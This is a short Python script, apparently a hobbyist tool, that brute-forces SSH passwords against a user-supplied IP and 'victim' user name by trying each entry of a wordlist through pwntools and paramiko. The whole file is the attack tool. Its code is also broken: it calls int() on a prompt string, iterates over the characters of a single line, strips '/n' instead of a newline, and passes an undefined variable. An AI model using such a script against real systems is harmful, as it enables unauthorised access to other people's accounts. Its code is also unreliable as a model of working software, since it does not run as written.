from pwn import *
import paramiko
import B1


def ssh_bruteforce():
    print(B1.woolf())  #banner must be instide def
    host = input("Enter IP Adress:") #ipadress taking
    user = input("Enter Victom user name") #victoms user name
    attempts = 0


    wordlist = int("Enter Your Wordlist Path: ") #locating wordlist path
    with open(wordlist, 'r') as file:  # wordlist opening step
        password = file.readline()  # wordlist reading


        for password in password:
            password = password.strip("/n") # new line
            try:
                print("[{}] Cracking password: '{}'!".format(attempts, password))
                response = ssh(host=host, user=username, password=password, timeout=1)



                if response.connected():
                    print("[>] Valid password found: '{}'!".format(password))
                    response.close()
                    break  # This break statement is inside the for loop

                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                print("[X] Invalid password")
                attempts +=1

ssh_bruteforce() #recalling function
